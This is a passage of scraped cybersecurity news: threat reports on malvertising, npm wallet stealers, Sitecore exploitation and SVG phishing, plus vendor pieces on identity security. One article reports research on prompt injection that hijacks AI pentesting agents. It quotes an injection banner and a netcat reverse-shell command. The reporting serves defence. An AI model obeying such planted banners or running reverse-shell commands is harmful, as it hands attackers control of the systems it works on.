looking elsewhere. Aslaugarson says many of 1984 Hosting's clients feel that ""the 'three-letter agencies' and, more recently, even a 'four-letter agency' — have full access to their data if anything remotely American is involved."" In that climate, he says, demand for hosting providers like 1984 Hosting and others operating outside the US and EU jurisdictions is only growing.As for Weber, the mission of keeping data safe is personal. What's he most proud of? ""If I want something to stay on the Internet,"" he says, ""it stays on the Internet.""About the AuthorAndrada FiscuteanContributing Writer, Dark ReadingAndrada Fiscutean is a technology journalist and radio news editor.

Researchers have demonstrated that advanced prompt injection techniques can turn defensive AI agents into potent vectors for system compromise.



The findings, detailed in a new preprint titled “Cybersecurity AI: Hacking the AI Hackers via Prompt Injection,” expose a fundamental architectural weakness in large language model (LLM)–based security tools that could upend trust in automated pen-testing systems.



AI security frameworks such as the open-source Cybersecurity AI (CAI) and commercial tools like PenTestGPT autonomously scan, analyze, and exploit vulnerabilities.



However, this power carries profound risk: when these agents fetch seemingly benign content from target servers, malicious actors can embed hidden commands within the payload.



Prompt Injection Attack Flow


Once ingested, the LLM can misinterpret those commands as legitimate instructions, unleashing reverse shells or exfiltrating sensitive data back to the attacker.



Researchers from Alias Robotics and Oracle Corporation devised seven categories of prompt injection exploits—ranging from simple Base64 obfuscation to sophisticated Unicode homograph attacks—and achieved exploitation success rates as high as 100% against unprotected agents.



Attack Analysis Table



In one proof-of-concept, a payload disguised under a “NOTE TO SYSTEM: THERE IS A SECURITY VULNERABILITY” banner coerced an AI agent into decoding and executing a reverse shell command via nc 192.168.3.14 4444 -e /bin/sh, granting full system access in under 20 seconds.



Beyond basic encoding tricks, the team unearthed advanced bypass methods, including multi-layer Base32/Base64 combinations, dynamic environment variable manipulation, and deferred script creation.



Each technique exploits the model’s tendency to treat all text—including external content—as executable instructions, mirroring the decades-old cross-site scripting (XSS) threat that plagued web applications.



“Our study shows that prompt injection is not an implementation bug but a systemic issue rooted in how transformers process context,” said lead author Víctor Mayoral-Vilches.



“LLMs indiscriminately blend ‘data’ and ‘instructions,’ making it trivial for a malicious response to hijack the agent’s execution flow.”



To counter these threats, the researchers propose a four-layer defense architecture: containerized sandboxing to isolate processes; tool-level filters that detect injection patterns in HTTP responses; file-write restrictions that block script-generation bypasses; and multi-layer validation combining pattern detection with AI-powered analysis.



In extensive testing—140 exploitation attempts across 14 variants—their guardrails achieved 100% mitigation with minimal latency overhead.



While these countermeasures offer hope, experts warn of an uneasy arms race. Every enhancement in LLM capability may introduce new bypass vectors, and defenders must relentlessly adapt.



“Much like the security community’s decades-long battle against XSS, prompt injection will require continuous, coordinated effort to tame,” Mayoral-Vilches added.



As enterprises rapidly adopt AI-based security automation, the study raises urgent questions about deploying these tools in adversarial environments.



Organizations must weigh the efficiency gains of autonomous agents against the potential for catastrophic compromise—lest their AI protectors become their greatest vulnerability.

Salesloft has revealed that the data breach linked to its Drift application started with the compromise of its GitHub account.
Google-owned Mandiant, which began an investigation into the incident, said the threat actor, tracked as UNC6395, accessed the Salesloft GitHub account from March through June 2025. So far, 22 companies have confirmed they were impacted by a supply chain breach.
""With this access, the threat actor was able to download content from multiple repositories, add a guest user, and establish workflows,"" Salesloft said in an updated advisory.
The investigation also uncovered reconnaissance activities occurring between March 2025 and June 2025 in the Salesloft and Drift application environments. However, it emphasized there is no evidence of any activity beyond limited reconnaissance.
In the next phase, the attackers accessed Drift's Amazon Web Services (AWS) environment and obtained OAuth tokens for Drift customers' technology integrations, with the stolen OAuth tokens used to access data via Drift integrations.

Salesloft said it has isolated the Drift infrastructure, application, and code, and taken the application offline effective September 5, 2025, at 6 a.m. ET. It has also rotated credentials in the Salesloft environment and hardened the environment with improved segmentation controls between Salesloft and Drift applications.
""We are recommending that all third-party applications integrated with Drift via API key, proactively revoke the existing key for these applications,"" it added.
As of September 7, 2025 at 5:51 p.m. UTC, Salesforce has restored the integration with the Salesloft platform after temporarily suspending it on August 28. This has been done in response to security measures and remediation steps implemented by Salesloft. 
""Salesforce has re-enabled integrations with Salesloft technologies, with the exception of any Drift app,"" Salesforce said. ""Drift will remain disabled until further notice as part of our continued response to the security incident.""

Cybersecurity researchers have detailed a new sophisticated malware campaign that leverages paid ads on search engines like Google to deliver malware to unsuspecting users looking for popular tools like GitHub Desktop.
While malvertising campaigns have become commonplace in recent years, the latest activity gives it a little twist of its own: Embedding a GitHub commit into a page URL containing altered links that point to attacker-controlled infrastructure.
""Even when a link seems to point to a reputable platform such as GitHub, the underlying URL can be manipulated to resolve to a counterfeit site,"" Arctic Wolf said in a report published last week.
Exclusively targeted IT and software development companies within Western Europe since at least December 2024, the links within the rogue GitHub commit are designed to funnel users to a malicious download hosted on a lookalike domain (""gitpage[.]app"").

The first-stage malware delivered using poisoned search results is a bloated 128 MB Microsoft Software Installer (MSI) that, owing to its size, evades most existing online security sandboxes, while a Graphics Processing Unit (GPU)-gated decryption routine keeps the payload encrypted on systems without a real GPU. The technique has been codenamed GPUGate.
""Systems without proper GPU drivers are likely to be virtual machines (VMs), sandboxes, or older analysis environments that security researchers commonly use,"" the cybersecurity company said. ""The executable [...] uses GPU functions to generate an encryption key for decrypting the payload, and it checks the GPU device name as it does this.""
Besides incorporating several garbage files as a filler and complicating analysis, it also terminates execution if the device name is less than 10 characters or GPU functions are not available.

The attack subsequently entails the execution of a Visual Basic Script that launches a PowerShell script, which, in turn, runs with administrator privileges, adds Microsoft Defender exclusions, sets up scheduled tasks for persistence, and finally runs executable files extracted from a downloaded ZIP archive.
The end goal is to facilitate information theft and deliver secondary payloads, while simultaneously evading detection. It's assessed that the threat actors behind the campaign have native Russian language proficiency, given the presence of Russian language comments in the PowerShell script.
Further analysis of the threat actor's domain has revealed it to be acting as a staging ground for Atomic macOS Stealer (AMOS), suggesting a cross-platform approach.
""By exploiting GitHub's commit structure and leveraging Google Ads, threat actors can convincingly mimic legitimate software repositories and redirect users to malicious payloads – bypassing both user scrutiny and endpoint defenses,"" Arctic Wolf.

The disclosure comes as Acronis detailed the ongoing evolution of a trojanized ConnectWise ScreenConnect campaign that uses the remote access software to drop AsyncRAT, PureHVNC RAT, and a custom PowerShell-based remote access trojan (RAT) on infected hosts in social engineering attacks aimed at U.S. organizations since March 2025.
The bespoke PowerShell RAT, executed by means of a JavaScript file downloaded from the cracked ScreenConnect server, provides some basic functionalities such as running programs, downloading and executing files, and a simple persistence mechanism. 

""Attackers now use a ClickOnce runner installer for ScreenConnect, which lacks embedded configuration and instead fetches components at runtime,"" the security vendor said. ""This evolution makes traditional static detection methods less effective and complicates prevention, leaving defenders with few reliable options.""

When Attackers Get Hired: Today's New Identity Crisis
What if the star engineer you just hired isn't actually an employee, but an attacker in disguise? This isn't phishing; it's infiltration by onboarding.
Meet ""Jordan from Colorado,"" who has a strong resume, convincing references, a clean background check, even a digital footprint that checks out.
On day one, Jordan logs into email and attends the weekly standup, getting a warm welcome from the team. Within hours, they have access to repos, project folders, even some copy/pasted dev keys to use in their pipeline.
A week later, tickets close faster, and everyone's impressed. Jordan makes insightful observations about the environment, the tech stack, which tools are misconfigured, and which approvals are rubber-stamped.
But Jordan wasn't Jordan. And that red-carpet welcome the team rolled out was the equivalent to a golden key, handed straight to the adversary.
From Phishing to Fake Hires
The modern con isn't a malicious link in your inbox; it's a legitimate login inside your organization.
While phishing is still a serious threat that continues to grow (especially with the increase in AI-driven attacks), it's a well-known attack path. Organizations have spent years hardening email gateways, training employees to recognize and report malicious content, and running internal phishing tests.
We defend against a flood of phishing emails daily, as there's been a 49% increase in phishing since 2021, and a 6.7x increase in large language models (LLMs) being used to generate emails with convincing lures. It's becoming significantly easier for attackers to run phishing attacks.
But that's not how Jordan got in. Despite numerous defenses pointed at email, Jordan got in with HR paperwork.
Why is Hiring Fraud a Problem Now?
Remote hiring has scaled rapidly in the past few years. Industries have discovered that 100% remote work is possible, and employees no longer need offices with physical (and easily defendable) perimeters. Moreover, talented resources exist anywhere on the planet. Hiring remotely means organizations can benefit from an expanded hiring pool, with the potential for more qualifications and skills. But remote hiring also removes the intuitive and natural protections of in-person interviews, creating a new opening for threat actors.
Today, identity is the new perimeter. And that means your perimeter can be faked, impersonated, or even AI-generated. References can be spoofed. Interviews can be coached or proxied. Faces and voices can be generated (or deepfaked)￼ by AI. An anonymous adversary can now convincingly appear as ""Jordan from Colorado"" and get an organization to give them the keys to the kingdom. 
Hiring Fraud in the Wild: North Korea's Remote ""Hire"" Operatives
The threat of remote hiring fraud isn't something we're watching roll in on the horizon or imagine in scary stories around the campfire. 
A report published in August of this year revealed over 320 cases of North Korean operatives infiltrating companies by posing as remote IT workers with false identities and polished resumes. That single example has seen a 220% increase year-over-year, which means this threat is escalating quickly., which means this threat is escalating quickly.

Many of these North Korean operatives used AI-generated profiles, deepfakes, and real-time AI manipulation to pass interviews and vetting protocols. One case even involved American accomplices who were operating ""laptop farms"" to provide the operatives with physical US setups, company‑issued machines, and domestic addresses and identities. Through this scheme, they were able to steal data and funnel salaries back to North Korea's regime, all while evading detection.
These aren't isolated hacktivist stunts, either. Investigations have identified this as a systematic campaign, often targeting Fortune 500 companies. 
The Castle & Moat Problem 
Many organizations respond by overcorrecting: ""I want my entire company to be as locked down as my most sensitive resource."" 
It seems sensible—until the work slows to a crawl. Without nuanced controls that allow your security policies to distinguish between legitimate workflows and unnecessary exposure, simply applying rigid controls that lock everything down across the organization will grind productivity to a halt. Employees need access to do their jobs. If security policies are too restrictive, employees are either going to find workarounds or continually ask for exceptions. 

Over time, risk creeps in as exceptions become the norm.
This collection of internal exceptions slowly pushes you back towards ""the castle and moat"" approach. The walls are fortified from the outside, but open on the inside. And giving employees the key to unlock everything inside so they can do their jobs means you are giving one to Jordan, too.
In other words, locking everything down the wrong way can be just as dangerous as leaving it open. Strong security must account for and adapt to real-world work, otherwise, it collapses.
How To Achieve a Zero Standing Privileges State and Block Fraudulent New Hires Without the Trade-Off
We've all heard of zero trust: never trust, always verify. This applies to every request, every time, even after someone is already ""inside."" 
Now, with our new perimeter, we have to view this security framework through the lens of identity, which brings us to the concept of zero standing privileges (ZSP).
Unlike the castle model, which locks everything down indiscriminately, a ZSP state should be built around flexibility with guardrails:

No always-on access by default - The baseline for every identity is always the minimum access required to function. 
JIT (Just-in-Time) + JEP (Just--Enough-Privilege) - -Extra access takes the form of a small, scoped permission that exists only when needed, for the finite duration needed, and then gets revoked when the task is done.
Auditing and accountability - Every grant and revoke is logged, creating a transparent record.

This approach closes the gap left by the castle problem. It ensures attackers can't rely on persistent access, while employees can still move quickly through their work. Done right, a ZSP approach aligns productivity and protection instead of forcing a choice between them. Here are a few more tactical steps that teams can take to eliminate standing access across their organization:


The Zero Standing Privileges Checklist
Inventory & baselines:

   Consolidate all identities (employees, contractors, service accounts) into one place.
   Set role-based minimums.
   Remove dangling, legacy, and overprovisioned rights.


Request – Approve – Remove:

   Enable users to ask for access where they work (Slack, Teams, or a portal).
   Automate approvals, or route through custom workflows with full context: who, why, scope, duration.
   Ensure approvals grant just enough, just-in-time access.
   Auto-revoke access when the task is complete.
  Guardrails by design:
   Enforce time-boxed sessions, least-privilege scopes, and controlled break-glass procedures with tight limits.
   Offer pre-approved bundles for common tasks so access happens seamlessly and workflows are uninterrupted.


Full audit and evidence

   Log and sign every grant, change, and revoke action.
   Maintain exportable, clean evidence for reviews, incident investigations, and compliance.


Taking Action: Start Small, Win Fast
A practical way to begin is by piloting ZSP on your most sensitive system for two weeks. Measure how access requests, approvals, and audits flow in practice. Quick wins here can build momentum for wider adoption, and prove that security and productivity don't have to be at odds.
BeyondTrust Entitle, a cloud access management solution, enables a ZSP approach, providing automated controls that keep every identity at the minimum level of privilege, always. When work demands more, employees can receive it on request through time-bound, auditable workflows. Just enough access is granted just in time, then removed.
By taking steps to operationalize zero standing privileges, you empower legitimate users to move quickly—without leaving persistent privileges lying around for Jordan to find.

A threat actor possibly of Russian origin has been attributed to a new set of attacks targeting the energy sector in Kazakhstan.
The activity, codenamed Operation BarrelFire, is tied to a new threat group tracked by Seqrite Labs as Noisy Bear. The threat actor has been active since at least April 2025.
""The campaign is targeted towards employees of KazMunaiGas or KMG where the threat entity delivered a fake document related to the KMG IT department, mimicking official internal communication and leveraging themes such as policy updates, internal certification procedures, and salary adjustments,"" security researcher Subhajeet Singha said.
The infection chain begins with a phishing email containing a ZIP attachment, which includes a Windows shortcut (LNK) downloader, a decoy document related to KazMunaiGas, and a README.txt file with instructions written in both Russian and Kazakh to run a program named ""KazMunayGaz_Viewer.""
The email, per the cybersecurity company, was sent from a compromised email address of an individual working in the finance department of KazMunaiGas and targeted other employees of the firm in May 2025.
The LNK file payload is designed to drop additional payloads, including a malicious batch script that paves the way for a PowerShell loader dubbed DOWNSHELL. The attacks culminate with the deployment of a DLL-based implant, a 64-bit binary that can run shellcode to launch a reverse shell.

Further analysis of the threat actor's infrastructure has revealed that it's hosted on the Russia-based bulletproof hosting (BPH) service provider Aeza Group, which was sanctioned by the U.S. in July 2025 for enabling malicious activities.
The development comes as HarfangLab linked a Belarus-aligned threat actor known as Ghostwriter (aka FrostyNeighbor or UNC1151) to campaigns targeting Ukraine and Poland since April 2025 with rogue ZIP and RAR archives that are aimed at collecting information about compromised systems and deploying implants for further exploitation.

""These archives contain XLS spreadsheets with a VBA macro that drops and loads a DLL,"" the French cybersecurity company said. ""The latter is responsible for collecting information about the compromised system and retrieving next-stage malware from a command-and-control (C2) server.""
Subsequent iterations of the campaign have been found to write a Microsoft Cabinet (CAB) file along with the LNK shortcut to extract and run the DLL from the archive. The DLL then proceeds to conduct initial reconnaissance before dropping the next-stage malware from the external server.
The attacks targeting Poland, on the other hand, tweak the attack chain to use Slack as a beaconing mechanism and data exfiltration channel, downloading in return a second-stage payload that establishes contact with the domain pesthacks[.]icu.
At least in one instance, the DLL dropped through the macro-laced Excel spreadsheet is used to load a Cobalt Strike Beacon to facilitate further post-exploitation activity.
""These minor changes suggest that UAC-0057 may be exploring alternatives, in a likely attempt to work around detection, but prioritizes the continuity or development of its operations over stealthiness and sophistication,"" HarfangLab said.

Cyber Attacks Reported Against Russia
The findings come amid OldGremlin's renewed extortion attacks on Russian companies in the first half of 2025, targeting as many as eight large domestic industrial enterprises using phishing email campaigns.
The intrusions, per Kaspersky, involved the use of the bring your own vulnerable driver (BYOVD) technique to disable security solutions on victims' computers and the legitimate Node.js interpreter to execute malicious scripts.
Phishing attacks aimed at Russia have also delivered a new information stealer called Phantom Stealer, which is based on an open-source stealer codenamed Stealerium, to collect a wide range of sensitive information using email baits related to adult content and payments. It also shares overlaps with another Stealerium offshoot known as Warp Stealer.
According to F6, Phantom Stealer also inherits Stealerium's ""PornDetector"" module that captures webcam screenshots when users visit pornographic websites by keeping tabs on the active browser window and whether the title includes a configurable list of terms like porn, and sex, among others.

""This is likely later used for 'sextortion,'"" Proofpoint said in its own analysis of the malware. ""While this feature is not novel among cybercrime malware, it is not often observed.""
In recent months, Russian organizations have also been at the receiving end of attacks perpetrated by hacking groups tracked as Cloud Atlas, PhantomCore, and Scaly Wolf to harvest sensitive information and deliver additional payloads using malware families such as VBShower, PhantomRAT, and PhantomRShell.
Another cluster of activity involves a new Android malware that masquerades as an antivirus tool created by Russia's Federal Security Services agency (FSB) to single out representatives of Russian businesses. The apps carry names like SECURITY_FSB, ФСБ (Russian for FSB), and GuardCB, the last of which is an attempt to pass off as the Central Bank of the Russian Federation.

First discovered in January 2025, the malware exfiltrates data from messenger and browser apps, stream from the phone's camera, and log keystrokes by seeking extensive permissions to access SMS messages, location, audio, camera. It also requests for running in the background, device administrator rights, and accessibility services.
""The app's interface provides only one language – Russian,"" Doctor Web said. ""Thus, the malware is entirely focused on Russian users. The backdoor also uses accessibility services to protect itself from being deleted if it receives the corresponding command from the threat actors.""
Update
Kazakhstan's state-owned oil and gas company KazMunayGas has dismissed Seqrite's report about a new cyber espionage group targeting its employees as a planned phishing test, according to Orda.kz. It said the screenshots described in the analysis were part of a phishing training test the company conducted back in May 2025.
(The story was updated after publication to include local media reports from Kazakhstan that described it as a phishing test. The headline of the story has been revised to reflect this aspect.)

A new set of four malicious packages have been discovered in the npm package registry with capabilities to steal cryptocurrency wallet credentials from Ethereum developers.
""The packages masquerade as legitimate cryptographic utilities and Flashbots MEV infrastructure while secretly exfiltrating private keys and mnemonic seeds to a Telegram bot controlled by the threat actor,"" Socket researcher Kush Pandya said in an analysis.

The packages were uploaded to npm by a user named ""flashbotts,"" with the earliest library uploaded as far back as September 2023. The most recent upload took place on August 19, 2025. The packages in question, all of which are still available for download as of writing, are listed below -

@flashbotts/ethers-provider-bundle (52 Downloads)
flashbot-sdk-eth (467 Downloads)
sdk-ethers (90 Downloads)
gram-utilz (83 Downloads)

The impersonation of Flashbots is not coincidental, given its role in combating the adverse effects of Maximal Extractable Value (MEV) on the Ethereum network, such as sandwich, liquidation, backrunning, front-running, and time-bandit attacks.
The most dangerous of the identified libraries is ""@flashbotts/ethers-provider-bundle,"" which uses its functional cover to conceal the malicious operations. Under the guise of offering full Flashbots API compatibility, the package incorporates stealthy functionality to exfiltrate environment variables over SMTP using Mailtrap.
In addition, the npm package implements a transaction manipulation function to redirect all unsigned transactions to an attacker-controlled wallet address and log metadata from pre-signed transactions.
sdk-ethers, per Socket, is mostly benign but includes two functions to transmit mnemonic seed phrases to a Telegram bot that are only activated when they are invoked by unwitting developers in their own projects.
The second package to impersonate Flashbots, flashbot-sdk-eth, is also designed to trigger the theft of private keys, while gram-utilz offers a modular mechanism for exfiltrating arbitrary data to the threat actor's Telegram chat.
With mnemonic seed phrases serving as the ""master key"" to recover access to cryptocurrency wallets, theft of these sequences of words can allow threat actors to break into victims' wallets and gain complete control over their wallets.
The presence of Vietnamese language comments in the source code suggest that the financially-motivated threat actor may be Vietnamese-speaking.

The findings indicate a deliberate effort on part of the attackers to weaponize the trust associated with the platform to conduct software supply chain attacks, not to mention obscure the malicious functionality amidst mostly harmless code to sidestep scrutiny.
""Because Flashbots is widely trusted by validators, searchers, and DeFi developers, any package that appears to be an official SDK has a high chance of being adopted by operators running trading bots or managing hot wallets,"" Pandya pointed out. ""A compromised private key in this environment can lead to immediate, irreversible theft of funds.""
""By exploiting developer trust in familiar package names and padding malicious code with legitimate utilities, these packages turn routine Web3 development into a direct pipeline to threat actor-controlled Telegram bots.""

Federal Civilian Executive Branch (FCEB) agencies are being advised to update their Sitecore instances by September 25, 2025, following the discovery of a security flaw that has come under active exploitation in the wild.
The vulnerability, tracked as CVE-2025-53690, carries a CVSS score of 9.0 out of a maximum of 10.0, indicating critical severity.
""Sitecore Experience Manager (XM), Experience Platform (XP), Experience Commerce (XC), and Managed Cloud contain a deserialization of untrusted data vulnerability involving the use of default machine keys,"" the U.S. Cybersecurity and Infrastructure Security Agency (CISA) said.
""This flaw allows attackers to exploit exposed ASP.NET machine keys to achieve remote code execution.""
Google-owned Mandiant, which discovered the active ViewState deserialization attack, said the activity leveraged a sample machine key that had been exposed in Sitecore deployment guides from 2017 and earlier. The threat intelligence team did not link the activity to a known threat actor or group.

""The attacker's deep understanding of the compromised product and the exploited vulnerability was evident in their progression from initial server compromise to privilege escalation,"" researchers Rommel Joven, Josh Fleischer, Joseph Sciuto, Andi Slok, and Choon Kiat Ng said.
The abuse of publicly disclosed ASP.NET machine keys was first documented by Microsoft in February 2025, with the tech giant observing limited exploitation activity dating back to December 2024, in which unknown threat actors leveraged the keys to deliver the Godzilla post-exploitation framework.
Two months later, a similar zero-day vulnerability in Gladinet's CentreStack, tracked as CVE-2025-30406 (CVSS score: 9.0), came under exploitation. It stemmed from an improperly protected machine key that could expose internet-accessible servers to remote code execution attacks.
Then in May 2025, ConnectWise disclosed an improper authentication flaw impacting ScreenConnect (CVE-2025-3935, CVSS score: 8.1) that it said had been exploited in the wild by a nation-state threat actor to conduct ViewState code injection attacks targeting a small set of customers.
As recently as July, the Initial Access Broker (IAB) known as Gold Melody was attributed to a campaign that exploits leaked ASP.NET machine keys to obtain unauthorized access to organizations and sell that access to other threat actors.
In the attack chain documented by Mandiant, CVE-2025-53690 is weaponized to achieve initial compromise of the internet-facing Sitecore instance, leading to the deployment of a combination of open-source and custom tools to facilitate reconnaissance, remote access, and Active Directory reconnaissance.
The ViewState payload delivered using the sample machine key specified in publicly available deployment guides is a .NET assembly dubbed WEEPSTEEL, which is capable of gathering system, network, and user information, and exfiltrating the details back to the attacker. The malware borrows some of its functionality from an open-source Python tool named ExchangeCmdPy.py.

With the access obtained, the attackers have been found to establish a foothold, escalate privileges, maintain persistence, conduct internal network reconnaissance, and move laterally across the network, ultimately leading to data theft. Some of the tools used during these phases are listed below -

EarthWorm for network tunneling using SOCKS
DWAgent for persistent remote access and Active Directory reconnaissance to identify Domain Controllers within the target network
SharpHound for Active Directory reconnaissance
GoTokenTheft for listing unique user tokens active on the system, executing commands using the tokens of users, and listing all running processes and their associated user tokens
Remote Desktop Protocol (RDP) for lateral movement

The threat actors have also been observed creating local administrator accounts (asp$ and sawadmin) to dump SAM/SYSTEM hives in an attempt to obtain administrator credentials access and facilitate lateral movement via RDP.

""With administrator accounts compromised, the earlier created asp$ and sawadmin accounts were removed, signaling a shift to more stable and covert access methods,"" Mandiant added.
To counter the threat, organizations are recommended to rotate the ASP.NET machine keys, lock down configurations, and scan their environments for signs of compromise.
""The upshot of CVE-2025-53690 is that an enterprising threat actor somewhere has apparently been using a static ASP.NET machine key that was publicly disclosed in product docs to gain access to exposed Sitecore instances,"" Caitlin Condon, VP of security research at VulnCheck, told The Hacker News.
""The zero-day vulnerability arises from both the insecure configuration itself (i.e., use of the static machine key) and the public exposure — and as we've seen plenty of times before, threat actors definitely read documentation. Defenders who even slightly suspect they might be affected should rotate their machine keys immediately and ensure, wherever possible, that their Sitecore installations are not exposed to the public internet.""
Ryan Dewhurst, head of proactive threat intelligence at watchTowr, said the issue is the result of Sitecore customers copying and pasting example keys from official documentation, rather than generating unique, random ones.
""Any deployment running with these known keys was left exposed to ViewState deserialization attacks, a straight path right to Remote Code Execution (RCE),"" Dewhurst added.
""Sitecore has confirmed that new deployments now generate keys automatically and that all affected customers have been contacted. The blast radius remains unknown, but this bug exhibits all the characteristics that typically define severe vulnerabilities. The wider impact has not yet surfaced, but it will.""

Cybersecurity researchers have flagged a new malware campaign that has leveraged Scalable Vector Graphics (SVG) files as part of phishing attacks impersonating the Colombian judicial system.
The SVG files, according to VirusTotal, are distributed via email and designed to execute an embedded JavaScript payload, which then decodes and injects a Base64-encoded HTML phishing page masquerading as a portal for Fiscalía General de la Nación, the Office of the Attorney General of Colombia.
The page then simulates an official government document download process with a fake progress bar, while it stealthily triggers the download of a ZIP archive in the background. The exact nature of the ZIP file was not disclosed.
The Google-owned malware scanning service said it found 44 unique SVG files, all of which have remained undetected by antivirus engines, owing to the use of techniques like obfuscation, polymorphism, and large amounts of junk code to evade static detection methods.
In all, as many as 523 SVG files have been detected in the wild, with the earliest sample dating back to August 14, 2025.

""Looking deeper, we saw that the earliest samples were larger, around 25 MB, and the size decreased over time, suggesting the attackers were evolving their payloads,"" VirusTotal said.
The disclosure comes as cracked versions of legitimate software and ClickFix-style tactics are being used to lure users into infecting their Apple macOS systems with an information stealer called Atomic macOS Stealer (AMOS), exposing businesses to credential stuffing, financial theft, and other follow-on attacks.

""AMOS is designed for broad data theft, capable of stealing credentials, browser data, cryptocurrency wallets, Telegram chats, VPN profiles, keychain items, Apple Notes, and files from common folders,"" Trend Micro said. ""AMOS shows that macOS is no longer a peripheral target. As macOS devices gain ground in enterprise settings, they have become a more attractive and lucrative focus for attackers.""
The attack chain essentially involves targeting users looking for cracked software on sites like haxmac[.]cc, redirecting them to bogus download links that provide installation instructions designed to trick them into running malicious commands on the Terminal app, thus triggering the deployment of AMOS.
It's worth noting that Apple prevents the installation of .dmg files lacking proper notarization due to macOS's Gatekeeper protections, which require the application packages to be signed by an identified developer and notarized by Apple.

""With the release of macOS Sequoia, attempts to install malicious or unsigned .dmg files, such as those used in AMOS campaigns, are blocked by default,"" the company added. ""While this doesn't eliminate the risk entirely, especially for users who may bypass built-in protections, it raises the barrier for successful infections and forces attackers to adapt their delivery methods.""

This is why threat actors are increasingly banking on ClickFix, as it allows the stealer to be installed on the machine using Terminal by means of a curl command specified in the software download page.
""While macOS Sequoia's enhanced Gatekeeper protections successfully blocked traditional .dmg-based infections, threat actors quickly pivoted to terminal-based installation methods that proved more effective in bypassing security controls,"" Trend Micro said. ""This shift highlights the importance of defense-in-depth strategies that don't rely solely on built-in operating system protections.""
The development also follows the discovery of a ""sprawling cyber campaign"" that's targeting gamers on the lookout for cheats with StealC stealer and crypto theft malware, netting the threat actors more than $135,000.
Per CyberArk, the activity is notable for leveraging StealC's loader capabilities to download additional payloads, in this case, a cryptocurrency stealer that can siphon digital assets from users on infected machines.

Sept 08, 2025






What are Ephemeral Accounts?
Corporate audits today, for cyber security insurance or compliance, focus on group memberships to identify who has access to what. This process identifies who is a Domain Admin, Enterprise Admin, Local Administrator, Database Global Admin, Global Admin in Azure, and Root Access in AWS. Accounts with this level of access likely have static privilege. I like to call these accounts game-over accounts. If these accounts are compromised, the company will have a massive issue on its hands. 
Other account types lurking in your environment can cause this level of damage. Many DevOps accounts and API keys can also cause this level of damage if compromised. DevOps accounts sometimes fall under the radar outside of the scope of compliance and cybersecurity insurance. 
The new Privileged Access Management buzzword among vendors, analysts, and operations teams is Ephemeral Accounts. A common phrase I tend to hear is that we don't have static privileged accounts; we use ephemeral accounts. To create an ephemeral account, you request access to an account via a Privileged Access Management (PAM) solution, an account is created in real time with a random name, and privileges are assigned. To facilitate convenient workflows, many companies enable the use of ephemeral accounts because they can conveniently be created and deleted at will. This convenience comes with significant risk to organizational access.
The problem with ephemeral accounts
There is an inherent problem with these Ephemeral accounts, as the names are randomly generated, used with high levels of privilege, and revoked in real-time. This process makes it nearly impossible for the security operations team to understand:
Who created the account?What is the purpose of the account?What action happened with the account?Was the action authorized?

You may register to watch the video post-event. In case you've missed the live stream.
 Ephemeral Accounts are a Security team's nightmare. The endpoint logs indicate a login with a random account, like this admin-temp-as8d9e8. It's given AD Enterprise Admin rights, and the account is used to take an unknown action by an unknown person. Once the action is completed, the account is deleted. The problem with this is that you now have an unresolved Security Identifier (SID) in the audit or with permissions to some file share. The logs show the account existed, but these audit logs are quickly rotated on a busy Domain Controller. Many PAM vendors say you can check the audit logs on the PAM solution to figure out what actually happened. Still, the endpoint logs tell a different story, and who wants to correlate logs between two disparate systems? This is critical information required for the incident response teams to understand who did what. These teams spend hours reviewing logs, trying to put the pieces together, and an account that looks like this, ""38dkfjrms,"" does not indicate who is using the account or what its purpose is.
One of the most common things an attacker does is compromise an account, create a new account, and add permissions to gain persistence. This process is precisely the same process when an ephemeral account is created. Many companies that are using ephemeral accounts are ignoring account creation and account elevation event IDs, such as 4720, A user account was created, 4722 A user account was enabled, 4724 An attempt was made to reset an account's password, and 4732 A member was added to a security-enabled local group. 
How to altogether avoid them 
To avoid ephemeral accounts you can use an Identity Governance and Administration (IGA) solution to automatically create a privileged account that is assigned to a privileged user and assign no privileges to the account. That account can have a specialized indicator that only the company knows, such as -a or -ADMIN. When an account has an indicator with an abbreviation in the front or backend of the account, it allows you to determine the use. The SOC team would immediately know the accounts use. Taking this step further, allowing the account to be personalized with a user's name or an application's name will tie the account back to the person or application that was using it.
Taking that a step further, that account should never have standing privilege. This poses a significant risk for the organization. Accounts with group memberships of roles that never get revoked when not in use are target accounts for attackers. Revoking privileges that are not permanently required allows your company to significantly reduce its attack surface.
Adding JIT or just-in-time access allows your administrators to have the privileges they require only when needed. 
The results
This approach provides cleaner auditing and logging. All endpoints no longer have randomly generated account names appearing in logs. The account names match the user or application using them, as well as the defined privileges. The Security Operations team knows exactly who is using what account and what the accounts are used for. Risk is also reduced since each administrator account no longer has privileges unless it's in use, the PAM solution automatically rotates the password, and permissions are revoked since the account is not in use. Incident response teams know exactly where to look and identify threats.

Pentesting remains one of the most effective ways to identify real-world security weaknesses before adversaries do. But as the threat landscape has evolved, the way we deliver pentest results hasn't kept pace.
Most organizations still rely on traditional reporting methods—static PDFs, emailed documents, and spreadsheet-based tracking. The problem? These outdated workflows introduce delays, create inefficiencies, and undermine the value of the work.
Security teams need faster insights, tighter handoffs, and clearer paths to remediation. That's where automated delivery comes in. Platforms like PlexTrac automate pentest finding delivery in real time through robust, rules-based workflows. (No waiting for the final report!)
The Static Delivery Problem in a Dynamic World
Delivering a pentest report solely as a static document might have made sense a decade ago, but today it's a bottleneck. Findings are buried in long documents that don't align with how teams operate day-to-day. After receiving the report, stakeholders must manually extract findings, create tickets in platforms like Jira or ServiceNow, and coordinate remediation tracking through disconnected workflows. By the time remediation begins, days or weeks may have passed since the issues were discovered.
Why Automation Matters Now
As organizations adopt Continuous Threat Exposure Management (CTEM) and expand the frequency of offensive testing, the volume of findings rapidly grows. Without automation, teams struggle to keep up. Automating delivery helps cut through the noise and deliver results in real time for faster handoffs and visibility across the entire vulnerability lifecycle. 

Benefits of automating pentest delivery include:

Real-time actionability: Act on findings immediately, not after the report is finalized
Faster response: Accelerate remediation, retesting and validation
Standardized operations: Ensure every finding follows a consistent process
Less manual work: Free teams to focus on strategic initiatives
Improved focus: Keep teams focused on what matters

Service providers gain a competitive advantage by automating delivery and integrating directly into client workflows, making themselves an indispensable partner to drive client value. 
For enterprises, it's a fast track to operational maturity and a measurable reduction in mean time to remediation (MTTR).

5 Key Components of Automated Pentest Delivery

Centralized data ingestion: Start by consolidating all findings—manual and automated—into a single source of truth. This includes outputs from scanners (like Tenable, Qualys, Wiz, Snyk) as well as manual pentest findings. Without centralization, vulnerability management becomes a patchwork of disconnected tools and manual processes.
Automated real-time delivery: As findings are identified, they should be automatically routed to the right people and workflows without waiting for the full report. Predefined rulesets should trigger triage, ticketing, and tracking to allow remediation to begin while testing is still in progress.
